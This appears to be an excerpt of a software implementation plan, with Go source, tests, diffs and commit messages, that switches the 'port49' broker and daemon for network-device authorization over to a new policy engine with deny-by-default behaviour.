	Metrics  *metrics.Metrics
	Fallback Authorizer

	mu    sync.Mutex
	cache map[string]*engine.Program
}

// blobCacheMax bounds the per-replica cache. Spec §5.1.2 expects a few dozen
// blobs per policy version across a 10,000-device fleet; past the bound one
// entry is dropped, and the next command naming it pays one store read.
const blobCacheMax = 1024

const (
	blobUnavailableMsg  = "port49: the policy for this session could not be read - run `port49 token` and log in again"
	storeUnavailableMsg = "port49: authorization store unavailable"
	platformMismatchMsg = "port49: this session's policy was compiled for another platform - run `port49 token` and log in again"
)

// program returns the compiled blob hash names, from the cache or the store.
// A non-empty reason is why it could not.
func (e *Engine) program(ctx context.Context, hash string) (*engine.Program, decision.Reason) {
	e.mu.Lock()
	p, ok := e.cache[hash]
	e.mu.Unlock()
	if ok {
		e.Metrics.BlobCache.WithLabelValues("hit").Inc()
		return p, ""
	}
	e.Metrics.BlobCache.WithLabelValues("miss").Inc()
	body, err := e.Store.GetBlob(ctx, hash)
	e.Metrics.StoreOps.WithLabelValues("get_blob", storeOutcome(err)).Inc()
	switch {
	case errors.Is(err, store.ErrNotFound):
		return nil, decision.BlobUnavailable
	case err != nil:
		return nil, decision.StoreUnavailable
	}
	b, err := engine.Decode(hash, body)
	if err != nil {
		return nil, decision.BlobUnavailable
	}
	if p, err = engine.Compile(b); err != nil {
		return nil, decision.BlobUnavailable
	}
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.cache == nil {
		e.cache = map[string]*engine.Program{}
	}
	if len(e.cache) >= blobCacheMax {
		for k := range e.cache {
			delete(e.cache, k)
			break
		}
	}
	e.cache[hash] = p
	return p, ""
}

// load is the preamble both points share: the program, checked against the
// device it is being asked about. A blob compiled for another platform than
// the device's carries that platform's dialect and attributes, so it is never
// answered from (roadmap, plan 4, carried from plan 3).
func (e *Engine) load(ctx context.Context, r Request) (*engine.Program, *Decision) {
	hash := r.Context.BlobHash
	p, reason := e.program(ctx, hash)
	switch reason {
	case "":
	case decision.StoreUnavailable:
		return nil, &Decision{Reason: reason, ServerMsg: storeUnavailableMsg, Policy: &decision.Policy{Blob: hash}}
	default:
		return nil, &Decision{Reason: reason, ServerMsg: blobUnavailableMsg, Policy: &decision.Policy{Blob: hash}}
	}
	if p.Blob.Platform != r.Device.Platform {
		return nil, &Decision{Reason: decision.BlobPlatformMismatch, ServerMsg: platformMismatchMsg,
			Policy: &decision.Policy{Bundle: p.Blob.Bundle, Blob: hash}}
	}
	return p, nil
}

// Session answers a session authorization with the blob's attributes, the
// four substitutions filled from the context and the device (spec §5.2, §6).
func (e *Engine) Session(ctx context.Context, r Request) Decision {
	if r.Context.BlobHash == "" {
		return e.fallback().Session(ctx, r)
	}
	p, denied := e.load(ctx, r)
	if denied != nil {
		return *denied
	}
	pol := &decision.Policy{Bundle: p.Blob.Bundle, Blob: r.Context.BlobHash}
	attrs, err := p.Blob.SessionAttributes(engine.Values{Username: r.Context.Username,
		Principal: r.Context.Principal, Device: r.Device.NAS})
	if err != nil {
		// The broker checked these values fit at mint, so the context no longer
		// holds what the token was minted for. Nothing partial is sent.
		return Decision{Reason: decision.BlobUnavailable, ServerMsg: blobUnavailableMsg, Policy: pol}
	}
	return Decision{Permit: true, Reason: decision.ContextMatched, Attributes: attrs, Policy: pol}
}

// Command decides one command vector against the blob (spec §5.3).
func (e *Engine) Command(ctx context.Context, r Request) Decision {
	if r.Context.BlobHash == "" {
		return e.fallback().Command(ctx, r)
	}
	p, denied := e.load(ctx, r)
	if denied != nil {
		return *denied
	}
	o := p.Command(r.Raw)
	return Decision{Permit: o.Permit, Reason: o.Reason, ServerMsg: o.ServerMsg(),
		Policy: o.Policy(p.Blob.Bundle, r.Context.BlobHash)}
}

// fallback is the authorizer for a context with no blob. A nil Fallback
// denies rather than panics: port49 never falls back to permitting everything.
func (e *Engine) fallback() Authorizer {
	if e.Fallback == nil {
		return denyAll{}
	}
	return e.Fallback
}

type denyAll struct{}

func (denyAll) Session(context.Context, Request) Decision {
	return Decision{Reason: decision.NoRuleMatched, ServerMsg: "port49: no policy for this session"}
}

func (denyAll) Command(context.Context, Request) Decision {
	return Decision{Reason: decision.NoRuleMatched, ServerMsg: "port49: no policy for this session"}
}
```

- [ ] **Step 4: Run the daemon's packages**

Run: `gofmt -l internal/daemon; go test ./internal/daemon/... -count=1 && go build ./...`
Expected: no gofmt output; PASS; the tree builds (`cmd/port49d` still wires `author.Blob`).

- [ ] **Step 5: Commit**

```bash
git add internal/daemon/author/ internal/daemon/metrics/ internal/daemon/server/server_test.go
git commit -m "feat: the daemon's policy engine authorizer

author.Engine decides sessions and commands against the context's
compiled blob, cached per replica by hash, and puts the policy block
on the record. A blob for another platform than the device's is
blob_platform_mismatch, a missing or corrupt one blob_unavailable, and
a store that does not answer store_unavailable, which authorization now
answers ERROR (spec §5.7; design §12). The Authorizer interface takes
a Request carrying the device.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 13: The broker and the daemon run the engine, and the slice's borrowed pieces go

**Files:**
- Modify: `internal/broker/broker.go`, `cmd/port49d/main.go`, `internal/daemon/metrics/metrics.go`,
  `tests/lab/slice/policy.yaml`
- Delete: `internal/blob/`, `internal/broker/policy/`, `internal/daemon/author/blob.go`,
  `internal/daemon/author/blob_test.go`
- Test: `internal/broker/engine_test.go`, `internal/policy/labpolicy_test.go`; modify
  `internal/broker/fixture_test.go`, `internal/broker/identity_test.go`,
  `internal/broker/broker_test.go`, `cmd/port49d/broker_test.go`

**Interfaces:**
- Consumes: `policy.Load`, `Policy.Resolve`, `ErrNoGrants`, `Policy.Bundle` (Tasks 8, 10);
  `engine.Encode`, `Blob.SessionAttributes` (Task 5); `author.Engine` (Task 12); `decision.Sink`
  (Task 2).
- Produces: `broker.Broker.Policy` is `*policy.Policy` from `internal/policy`; a mint item error
  `attribute_too_long`; the mint record's `policy.bundle`; `putBlob` marks a blob emitted only when
  the sink took it. `buildBroker` loads the policy with `policy.Env{Devices: cfg.Inventory.Devices,
  EnableUsernames: cfg.EnableUsernames}`. `run` wires `&author.Engine{Store: st, Metrics: m,
  Fallback: &author.Lab{…}}`.

This is the switch (Decided 1). Before it the broker writes plan 3's blob and the daemon reads it;
after it both speak version 2, in one commit, so no build of this branch writes a blob its own
daemon cannot read. `all_devices` is an ordinary scope now (Decided 20), so every policy in the
tree declares it — the lab's slice policy included, and a new test loads that file against the
lab's own inventory.

- [ ] **Step 1: Move the tests to the new policy, and write the failing ones**

<!-- write: internal/broker/engine_test.go -->
```go
package broker

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rhwendt/port49/internal/admission"
	"github.com/rhwendt/port49/internal/decision"
	"github.com/rhwendt/port49/internal/policy"
)

// refusingSink refuses blob records while down and passes everything else.
type refusingSink struct {
	next decision.Sink
	down bool
}

func (r *refusingSink) Emit(rec decision.Record) { _ = r.Write(rec) }

func (r *refusingSink) Write(rec decision.Record) error {
	if r.down && rec.Event == decision.EventBlob {
		return errors.New("sink: disk full")
	}
	return r.next.Write(rec)
}

// A blob record the sink refused is emitted again by the next mint that
// writes the hash: replay reads the log alone (spec §5.7), and a mint naming a
// blob the log never carried cannot be replayed (roadmap, plan 4).
func TestARefusedBlobRecordIsEmittedAgain(t *testing.T) {
	f := newFixture(t, 8)
	sink := &refusingSink{next: f.b.Log.(decision.Sink), down: true}
	f.b.Log = sink
	decodeMint(t, f.post(context.Background(), f.state(f.alice), `{"devices":["leaf1"]}`, ""))
	if n := len(f.blobRecords(t)); n != 0 {
		t.Fatalf("the refused blob reached the log %d times", n)
	}
	sink.down = false
	decodeMint(t, f.post(context.Background(), f.state(f.alice), `{"devices":["leaf1"]}`, ""))
	decodeMint(t, f.post(context.Background(), f.state(f.alice), `{"devices":["leaf1"]}`, ""))
	if n := len(f.blobRecords(t)); n != 1 {
		t.Fatalf("after the sink recovered the blob is emitted once, got %d", n)
	}
}

// The mint record names the policy it was decided against (spec §5.7), and a
// grant's expiry rides on the grant.
func TestAMintRecordNamesItsBundle(t *testing.T) {
	f := newFixture(t, 8)
	decodeMint(t, f.post(context.Background(), f.state(f.alice), `{"devices":["leaf1"]}`, ""))
	mints := eventsOf(f.records(t), "mint")
	pol, _ := mints[len(mints)-1]["policy"].(map[string]any)
	if pol["bundle"] != f.b.Policy.Bundle || !strings.HasPrefix(f.b.Policy.Bundle, "sha256:") {
		t.Fatalf("mint record policy: %v", pol)
	}
}

// An attribute the principal's own values would push past 255 bytes is the
// broker's refusal, by name, rather than a session the device cannot be sent.
// The template itself fits (252 bytes); `{principal}` filled in does not.
func TestASessionReplyThatWillNotFitIsRefusedAtMint(t *testing.T) {
	f := newFixture(t, 8)
	path := filepath.Join(t.TempDir(), "policy.yaml")
	body := `
scopes: [{name: all_devices, match: {}}]
roles: [{name: r, privilege: admin, permit: ["**"], attributes: {all: ["note*` + strings.Repeat("x", 235) + ` {principal}"]}}]
subjects: [{name: s, identity: "user:alice@example.com", username: alice, token_ttl: 60s}]
grants: [{subject: s, scope: all_devices, roles: [r]}]
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	pol, err := policy.Load(path, policy.Env{Devices: []admission.Device{f.b.Devices["leaf1"]}})
	if err != nil {
		t.Fatal(err)
	}
	f.b.Policy = pol
	resp := decodeMint(t, f.post(context.Background(), f.state(f.alice), `{"devices":["leaf1"]}`, ""))
	if it := resp.Results[0]; it.Error != "attribute_too_long" || it.Login != "" {
		t.Fatalf("%+v", it)
	}
}
```

<!-- patch: internal/broker/fixture_test.go -->
```diff
diff --git a/internal/broker/fixture_test.go b/internal/broker/fixture_test.go
index e77fa95..6354f8d 100644
--- a/internal/broker/fixture_test.go
+++ b/internal/broker/fixture_test.go
@@ -20,15 +20,17 @@ import (
 
 	"github.com/rhwendt/port49/internal/admission"
 	"github.com/rhwendt/port49/internal/broker/api"
-	"github.com/rhwendt/port49/internal/broker/policy"
 	"github.com/rhwendt/port49/internal/daemon/metrics"
 	"github.com/rhwendt/port49/internal/decision"
+	"github.com/rhwendt/port49/internal/policy"
 	"github.com/rhwendt/port49/internal/store/memory"
 	"github.com/rhwendt/port49/internal/testpki"
 	"github.com/rhwendt/port49/internal/token"
 )
 
 const testPolicy = `
+scopes:
+  - {name: all_devices, match: {}}
 roles:
   - {name: network_admin, privilege: admin, permit: ["**"]}
   - {name: no_reload, deny: ["reload **"]}
@@ -65,7 +67,12 @@ func newFixture(t *testing.T, candidateCap int) *fixture {
 	if err := os.WriteFile(path, []byte(testPolicy), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	pol, err := policy.Load(path)
+	devices := map[string]admission.Device{
+		"leaf1": {Name: "leaf1", Platform: "arista_eos", Addresses: []netip.Addr{netip.MustParseAddr("172.100.100.11")}},
+		"nx1":   {Name: "nx1", Platform: "cisco_nxos", Addresses: []netip.Addr{netip.MustParseAddr("172.100.100.31")}},
+		"bare":  {Name: "bare", Addresses: []netip.Addr{netip.MustParseAddr("172.100.100.41")}},
+	}
+	pol, err := policy.Load(path, policy.Env{Devices: []admission.Device{devices["leaf1"], devices["nx1"], devices["bare"]}})
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -74,12 +81,7 @@ func newFixture(t *testing.T, candidateCap int) *fixture {
 	}
 	f.alice = f.client(t, "alice@example.com", f.now.Add(24*time.Hour))
 	log := decision.NewJSONLines(f.log)
-	f.b = &Broker{Policy: pol,
-		Devices: map[string]admission.Device{
-			"leaf1": {Name: "leaf1", Platform: "arista_eos", Addresses: []netip.Addr{netip.MustParseAddr("172.100.100.11")}},
-			"nx1":   {Name: "nx1", Platform: "cisco_nxos", Addresses: []netip.Addr{netip.MustParseAddr("172.100.100.31")}},
-			"bare":  {Name: "bare", Addresses: []netip.Addr{netip.MustParseAddr("172.100.100.41")}},
-		},
+	f.b = &Broker{Policy: pol, Devices: devices,
 		Minter: token.NewMinter(f.st, log, rand.Reader, token.TagKey([]byte("k")), clock, candidateCap),
 		Store:  f.st, Log: log, Metrics: metrics.New(prometheus.NewRegistry()), Now: clock,
 		MaxSessionAge: 12 * time.Hour, BatchMax: 4}
```

<!-- patch: internal/broker/identity_test.go -->
```diff
diff --git a/internal/broker/identity_test.go b/internal/broker/identity_test.go
index 154c94e..6efe116 100644
--- a/internal/broker/identity_test.go
+++ b/internal/broker/identity_test.go
@@ -10,7 +10,7 @@ import (
 	"testing"
 	"time"
 
-	"github.com/rhwendt/port49/internal/broker/policy"
+	"github.com/rhwendt/port49/internal/policy"
 	"github.com/rhwendt/port49/internal/testpki"
 )
 
@@ -152,6 +152,8 @@ func TestAPrincipalMatchesItsPolicyIdentity(t *testing.T) {
 	}
 	path := filepath.Join(t.TempDir(), "policy.yaml")
 	if err := os.WriteFile(path, []byte(`
+scopes:
+  - {name: all_devices, match: {}}
 roles:
   - {name: r, privilege: admin, permit: ["**"]}
 subjects:
@@ -161,7 +163,7 @@ grants:
 `), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	p, err := policy.Load(path)
+	p, err := policy.Load(path, policy.Env{})
 	if err != nil {
 		t.Fatal(err)
 	}
```

<!-- patch: internal/broker/broker_test.go -->
```diff
diff --git a/internal/broker/broker_test.go b/internal/broker/broker_test.go
index 0ebd913..88cbe65 100644
--- a/internal/broker/broker_test.go
+++ b/internal/broker/broker_test.go
@@ -15,9 +15,9 @@ import (
 
 	"github.com/prometheus/client_golang/prometheus/testutil"
 
-	"github.com/rhwendt/port49/internal/blob"
 	"github.com/rhwendt/port49/internal/broker/api"
 	"github.com/rhwendt/port49/internal/decision"
+	"github.com/rhwendt/port49/internal/engine"
 	"github.com/rhwendt/port49/internal/store"
 	"github.com/rhwendt/port49/internal/token"
 )
@@ -84,10 +84,10 @@ func TestTheBlobIsWrittenAndEmittedOncePerHash(t *testing.T) {
 	}
 	logged := map[string]bool{}
 	for _, bl := range blobs {
-		if blob.HashOf(bl.Body) != bl.Hash {
+		if engine.HashOf(bl.Body) != bl.Hash {
 			t.Fatalf("the logged body does not hash to its name %q", bl.Hash)
 		}
-		if _, err := blob.Decode(bl.Hash, bl.Body); err != nil {
+		if _, err := engine.Decode(bl.Hash, bl.Body); err != nil {
 			t.Fatalf("the logged blob cannot be replayed: %v", err)
 		}
 		logged[bl.Hash] = true
@@ -102,7 +102,7 @@ func TestTheBlobIsWrittenAndEmittedOncePerHash(t *testing.T) {
 		if err != nil {
 			t.Fatalf("mint names blob %q the store does not hold: %v", hash, err)
 		}
-		b, err := blob.Decode(hash, body)
+		b, err := engine.Decode(hash, body)
 		if err != nil {
 			t.Fatal(err)
 		}
```

<!-- patch: cmd/port49d/broker_test.go -->
```diff
diff --git a/cmd/port49d/broker_test.go b/cmd/port49d/broker_test.go
index 82f3268..4400ff8 100644
--- a/cmd/port49d/broker_test.go
+++ b/cmd/port49d/broker_test.go
@@ -43,6 +43,7 @@ func brokerConfig(t *testing.T, policyBody string) config.Config {
 }
 
 const minimalPolicy = `
+scopes: [{name: all_devices, match: {}}]
 roles: [{name: r, privilege: admin, permit: ["**"]}]
 subjects: [{name: s, identity: ["user:alice@example.com"], username: alice, token_ttl: 60s}]
 grants: [{subject: s, scope: all_devices, roles: [r]}]
@@ -83,8 +84,10 @@ func TestABrokerBuildsFromItsFiles(t *testing.T) {
 
 // Everything that can fail on a typo fails before a listener opens.
 func TestABrokerThatCannotLoadFailsTheStart(t *testing.T) {
-	if err := buildWith(brokerConfig(t, "roles: [{name: r, privilege: operator}]\n")); err == nil ||
-		!strings.Contains(err.Error(), "operator") {
+	// Checked against the inventory: leaf1 is arista_eos, which renders no
+	// `operator` (internal/platform).
+	if err := buildWith(brokerConfig(t, strings.Replace(minimalPolicy, "privilege: admin", "privilege: operator", 1))); err == nil ||
+		!strings.Contains(err.Error(), "level operator has no rendering on arista_eos") {
 		t.Fatalf("a bad policy: %v", err)
 	}
 	cfg := brokerConfig(t, minimalPolicy)
```

<!-- write: internal/policy/labpolicy_test.go -->
```go
package policy

import (
	"net/netip"
	"path/filepath"
	"runtime"
	"testing"

	"github.com/rhwendt/port49/internal/admission"
)

// The lab's policy is loaded by a daemon only inside `make lab`. Loading it here,
// against the lab's own inventory, means a typo in it — or a check it newly
// fails — fails `make test`, not a VM boot ten minutes in.
func TestTheLabPolicyLoads(t *testing.T) {
	_, file, _, _ := runtime.Caller(0)
	root := filepath.Join(filepath.Dir(file), "..", "..")
	inv, err := admission.LoadFile(filepath.Join(root, "tests", "lab", "inventory-lab.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	p, err := Load(filepath.Join(root, "tests", "lab", "slice", "policy.yaml"), Env{Devices: inv.Devices})
	if err != nil {
		t.Fatal(err)
	}
	leaf := admission.Device{Name: "leaf1", Platform: "arista_eos", Addresses: []netip.Addr{netip.MustParseAddr("172.100.100.11")}}
	r, err := p.Resolve("user:alice@slice.port49.test", leaf, noon)
	if err != nil || r.Username != "slice01" || r.MaxPrivilege != 15 {
		t.Fatalf("%+v %v", r, err)
	}
	_, o, err := p.Decide("", "user:alice@slice.port49.test", leaf, "show hostname", noon)
	if err != nil || o.Permit || o.Deny == nil || o.Deny.Role != "slice_denies" {
		t.Fatalf("the slice's one denial: %+v %v", o, err)
	}
}
```

<!-- patch: tests/lab/slice/policy.yaml -->
```diff
diff --git a/tests/lab/slice/policy.yaml b/tests/lab/slice/policy.yaml
index 7c556a9..41927c9 100644
--- a/tests/lab/slice/policy.yaml
+++ b/tests/lab/slice/policy.yaml
@@ -6,6 +6,10 @@
 #
 # `slice01` is a username no seed uses, so nothing but a broker-minted token can
 # log in under it.
+#
+# `all_devices` is declared: since plan 4 it is an ordinary scope (spec §5.5).
+scopes:
+  - {name: all_devices, match: {}}
 roles:
   - {name: network_admin, privilege: admin, permit: ["**"]}
   - {name: slice_denies, deny: ["show hostname"]}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go vet ./internal/broker/ ./cmd/port49d/`
Expected: FAIL to build — the tests use `internal/policy` and the broker still holds plan 3's
`*"…/internal/broker/policy".Policy`: `f.b.Policy.Bundle undefined`, and the fixture's `pol`
cannot be assigned to `Broker.Policy`.

- [ ] **Step 3: Switch the broker and the daemon, and delete what the engine replaces**

<!-- patch: internal/broker/broker.go -->
```diff
diff --git a/internal/broker/broker.go b/internal/broker/broker.go
index 0a195ce..95a1e03 100644
--- a/internal/broker/broker.go
+++ b/internal/broker/broker.go
@@ -1,6 +1,6 @@
 // Package broker is the vertical slice's broker (design §19 step 3): POST
 // /v1/tokens and GET /v1/config, over a held mutual-TLS connection, against
-// one trust anchor and the file policy of internal/broker/policy, minting
+// one trust anchor and the policy engine (internal/policy, plan 4), minting
 // through plan 2's token.Minter. It runs inside port49d because the only store
 // is in-process (plan 3, Decided 1). Plan 7 builds the broker in full: OIDC,
 // the directory, the rest of §17, and the api: rights model — until then a
@@ -27,11 +27,11 @@ import (
 	"time"
 
 	"github.com/rhwendt/port49/internal/admission"
-	"github.com/rhwendt/port49/internal/blob"
 	"github.com/rhwendt/port49/internal/broker/api"
-	"github.com/rhwendt/port49/internal/broker/policy"
 	"github.com/rhwendt/port49/internal/daemon/metrics"
 	"github.com/rhwendt/port49/internal/decision"
+	"github.com/rhwendt/port49/internal/engine"
+	"github.com/rhwendt/port49/internal/policy"
 	"github.com/rhwendt/port49/internal/store"
 	"github.com/rhwendt/port49/internal/token"
 )
@@ -221,10 +221,16 @@ func (b *Broker) mintOne(ctx context.Context, principal string, cred store.Crede
 		// device and no platform, which is what tells an operator which.
 		return deny(decision.NoGrantsMatched, ""), nil
 	}
-	res, ok := b.Policy.Resolve(principal, dev.Platform)
-	if !ok {
+	res, err := b.Policy.Resolve(principal, dev, b.Now())
+	if errors.Is(err, policy.ErrNoGrants) {
 		return deny(decision.NoGrantsMatched, dev.Platform), nil
 	}
+	if err != nil {
+		// The policy's load-time checks compile every subject on every device
+		// in inventory, so this is a broker defect, not a refusal.
+		log.Printf("broker: resolving %s on %q: %v", principal, name, err)
+		return b.fault(name, "broker_error", "the broker could not compile this device's policy; tell the operator"), nil
+	}
 	// Inventory may name a device with no platform (admission.LoadFile does
 	// not require one), and no blob can be compiled for it. That is the
 	// operator's inventory to fix, not a refusal of the caller, so it is this
@@ -236,13 +242,24 @@ func (b *Broker) mintOne(ctx context.Context, principal string, cred store.Crede
 		return b.fault(name, "device_unconfigured",
 			"inventory gives this device no platform, so the broker cannot compile its policy; tell the operator"), nil
 	}
-	body, hash, err := blob.Encode(res.Blob)
+	body, hash, err := engine.Encode(res.Blob)
 	if err != nil {
 		// Policy load checks every rule, so this is a broker defect, not a
 		// refusal. The error names policy content and is the operator's.
 		log.Printf("broker: the policy for %s on %q compiled to a blob the daemon would refuse: %v", principal, name, err)
 		return b.fault(name, "broker_error", "the broker could not compile this device's policy; tell the operator"), nil
 	}
+	// The daemon fills the session reply's placeholders from the context, at
+	// each session authorization (spec §5.2), with the values the broker holds
+	// now. An attribute they would push past 255 bytes is refused here, where
+	// the operator can be told, rather than there, where the device can only
+	// be refused.
+	if _, err := res.Blob.SessionAttributes(engine.Values{Username: res.Username, Principal: principal,
+		Device: name}); err != nil {
+		log.Printf("broker: the session reply for %s on %q does not fit the wire: %v", principal, name, err)
+		return b.fault(name, "attribute_too_long",
+			"a session attribute for this device is longer than 255 bytes once filled in; tell the operator"), nil
+	}
 	if err := b.putBlob(ctx, hash, body); err != nil {
 		return deny(decision.StoreUnavailable, dev.Platform), nil
 	}
@@ -253,7 +270,7 @@ func (b *Broker) mintOne(ctx context.Context, principal string, cred store.Crede
 		Device: name, Platform: dev.Platform, BlobHash: hash, WithEnable: req.Enable,
 		TTL:            time.Duration(req.TTLSeconds) * time.Second,
 		IdempotencyKey: key, BodyHash: bodyHash,
-		Policy: &decision.Policy{Subject: res.Subject, Grants: res.Grants}})
+		Policy: &decision.Policy{Bundle: b.Policy.Bundle, Subject: res.Subject, Grants: res.Grants}})
 	var capped *token.ErrTooManyOutstanding
 	switch {
 	case errors.Is(err, token.ErrIdempotencyConflict):
@@ -299,10 +316,11 @@ func (b *Broker) fault(name, code, detail string) api.MintItem {
 // hash's blob record. Emit is one buffered line write, so that is all the lock
 // holds.
 //
-// A record the sink drops is still marked emitted: Emit returns no error. The
-// drop is counted by port49_decision_log_write_failures_total, which is the
-// operator's cue that replay from the log is incomplete. Re-emitting a
-// dropped blob is plan 4's, with per-replica emission.
+// A blob record the sink refuses is not marked emitted, so the next mint that
+// writes the hash emits it again (roadmap, plan 4): replay reads the log alone,
+// and a mint record naming a blob the log never carried cannot be replayed.
+// The refusal is counted by port49_decision_log_write_failures_total. An
+// Emitter that cannot report a refusal is trusted, as before.
 func (b *Broker) putBlob(ctx context.Context, hash string, body []byte) error {
 	if err := b.Store.PutBlob(ctx, hash, body, b.MaxSessionAge); err != nil {
 		return err
@@ -313,8 +331,13 @@ func (b *Broker) putBlob(ctx context.Context, hash string, body []byte) error {
 		b.blobsSeen = map[string]bool{}
 	}
 	if !b.blobsSeen[hash] {
-		b.blobsSeen[hash] = true
-		b.Log.Emit(decision.Record{TS: b.Now(), Event: decision.EventBlob, Blob: &decision.Blob{Hash: hash, Body: body}})
+		rec := decision.Record{TS: b.Now(), Event: decision.EventBlob, Blob: &decision.Blob{Hash: hash, Body: body}}
+		if sink, ok := b.Log.(decision.Sink); ok {
+			b.blobsSeen[hash] = sink.Write(rec) == nil
+		} else {
+			b.Log.Emit(rec)
+			b.blobsSeen[hash] = true
+		}
 	}
 	return nil
 }
```

<!-- patch: cmd/port49d/main.go -->
```diff
diff --git a/cmd/port49d/main.go b/cmd/port49d/main.go
index 3370855..ae5ae89 100644
--- a/cmd/port49d/main.go
+++ b/cmd/port49d/main.go
@@ -29,7 +29,6 @@ import (
 
 	"github.com/rhwendt/port49/internal/admission"
 	"github.com/rhwendt/port49/internal/broker"
-	"github.com/rhwendt/port49/internal/broker/policy"
 	"github.com/rhwendt/port49/internal/config"
 	"github.com/rhwendt/port49/internal/daemon/acct"
 	"github.com/rhwendt/port49/internal/daemon/authen"
@@ -39,6 +38,7 @@ import (
 	"github.com/rhwendt/port49/internal/daemon/server"
 	"github.com/rhwendt/port49/internal/decision"
 	"github.com/rhwendt/port49/internal/platform"
+	"github.com/rhwendt/port49/internal/policy"
 	"github.com/rhwendt/port49/internal/session"
 	"github.com/rhwendt/port49/internal/store"
 	"github.com/rhwendt/port49/internal/store/crypt"
@@ -157,7 +157,11 @@ func buildBroker(cfg config.Config, st store.Store, minter *token.Minter, log de
 	if cfg.Broker == nil {
 		return nil, nil
 	}
-	pol, err := policy.Load(cfg.Broker.PolicyFile)
+	// The policy is checked against the inventory the daemon admits from: a
+	// class a platform in it does not define, or a level it cannot render, is
+	// refused here rather than at the first mint for that device (spec §4, §6).
+	pol, err := policy.Load(cfg.Broker.PolicyFile, policy.Env{Devices: cfg.Inventory.Devices,
+		EnableUsernames: cfg.EnableUsernames})
 	if err != nil {
 		return nil, fmt.Errorf("broker.policy_file %s: %w", cfg.Broker.PolicyFile, err)
 	}
@@ -273,12 +277,12 @@ func run(cfgPath string) error {
 	spoolDone := make(chan struct{})
 	go func() { defer close(spoolDone); spool.Run(spoolCtx) }()
 
-	// A context the broker minted names a compiled blob and is answered from
-	// it (plan 3). A context with no blob — the lab's seeds — is answered by
-	// the lab authorizer, which stays until the policy engine lands (plan 4);
-	// config.Load refuses a config without it, so the fallback is never nil and
-	// port49 never falls back to permitting everything.
-	authz := &author.Blob{Store: st, Fallback: &author.Lab{
+	// A context the broker minted names a compiled blob and is answered from it
+	// by the policy engine (plan 4). A context with no blob — the lab's seeds —
+	// is answered by the lab authorizer; config.Load refuses a config without
+	// it, so the fallback is never nil and port49 never falls back to
+	// permitting everything.
+	authz := &author.Engine{Store: st, Metrics: m, Fallback: &author.Lab{
 		SessionAttributes: cfg.Lab.SessionAttributes,
 		CommandAttributes: cfg.Lab.CommandAttributes,
 		DenyPrefixes:      cfg.Lab.DenyPrefixes,
```

<!-- patch: internal/daemon/metrics/metrics.go -->
```diff
diff --git a/internal/daemon/metrics/metrics.go b/internal/daemon/metrics/metrics.go
index 2e50a56..cf5ccbf 100644
--- a/internal/daemon/metrics/metrics.go
+++ b/internal/daemon/metrics/metrics.go
@@ -48,9 +48,11 @@ type Metrics struct {
 	Attributions *prometheus.CounterVec
 	// port49_broker_item_errors_total{error}: mint items the broker could not
 	// decide, by the API error code on the item — "device_unconfigured" (an
-	// inventory device with no platform) or "broker_error" (a policy that
-	// compiled to a blob the daemon would refuse). Neither is a decision, so
-	// neither is in port49_decisions_total. The label is the code only.
+	// inventory device with no platform), "broker_error" (a policy that
+	// compiled to a blob the daemon would refuse), or "attribute_too_long" (a
+	// session attribute the principal's own values push past 255 bytes). None
+	// is a decision, so none is in port49_decisions_total. The label is the
+	// code only.
 	BrokerItemErrors *prometheus.CounterVec
 	// port49_blob_cache_lookups_total{outcome}: the authorizer's per-replica
 	// blob cache, "hit" or "miss" (spec §5.1.1). A miss is one store read,
```

Then remove plan 3's borrowed-ahead blob, its authorizer and its policy:

```bash
git rm -r -q internal/blob internal/broker/policy internal/daemon/author/blob.go internal/daemon/author/blob_test.go
```

<!-- delete: internal/blob -->
<!-- delete: internal/broker/policy -->
<!-- delete: internal/daemon/author/blob.go -->
<!-- delete: internal/daemon/author/blob_test.go -->

- [ ] **Step 4: Run the tree**

Run: `gofmt -l .; go vet ./... && go test ./... -count=1 && go vet -tags lab ./tests/lab/...`
Expected: no gofmt output; PASS everywhere. `grep -rn 'internal/blob"\|broker/policy"' --include='*.go' .`
prints nothing.

- [ ] **Step 5: Commit**

```bash
git add -A internal/ cmd/port49d/ tests/lab/slice/policy.yaml
git commit -m "refactor: broker and daemon run the policy engine; the slice's blob goes

The broker resolves and compiles through internal/policy and writes
version-2 blobs; port49d answers them with author.Engine. A session
attribute the principal's own values push past 255 bytes is refused
at mint (attribute_too_long). The mint record names its bundle, and a
blob event the sink refused is emitted again by the next mint.
internal/blob, author.Blob and internal/broker/policy, borrowed ahead
by plan 3, are removed. all_devices is declared in the slice policy.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 14: `port49d` runs without a `lab:` block

**Files:**
- Modify: `internal/config/config.go`, `cmd/port49d/main.go`
- Test: modify `internal/config/config_test.go`

**Interfaces:**
- Produces: `config.Config.Lab` is nil when the file has no `lab:` block; `run` then wires
  `author.Engine` with no fallback, so a context with no blob is denied, and mints no seeds.

Plan 1 made `lab:` required because without it there was no authorizer at all. There is one now
(Decided 12). The `broker:` comment's "Plan 4 brings reload" is corrected: reload is plan 7's
(roadmap).

- [ ] **Step 1: Write the failing test**

<!-- patch: internal/config/config_test.go -->
```diff
diff --git a/internal/config/config_test.go b/internal/config/config_test.go
index 90c69c8..64a9dc2 100644
--- a/internal/config/config_test.go
+++ b/internal/config/config_test.go
@@ -15,7 +15,7 @@ import (
 // The sample config is assembled from three pieces rather than written twice,
 // because exactly one test has to load a config that names no encryption key
 // and every other test must load one that does. Splitting it also puts
-// `encryption:` ahead of `lab:`, so TestLoadRequiresLabBlock's truncation at
+// `encryption:` ahead of `lab:`, so TestLoadWithoutALabBlock's truncation at
 // `lab:` removes the lab block and nothing else.
 const sampleHead = `
 listen: ":4949"
@@ -252,17 +252,20 @@ func TestLoadRefusesZeroOrNegativeWindows(t *testing.T) {
 	}
 }
 
-func TestLoadRequiresLabBlock(t *testing.T) {
+// Since the policy engine (plan 4) the lab: block is optional: a daemon with
+// none runs the engine alone, and Lab is nil so nothing builds the lab's
+// instrument by accident.
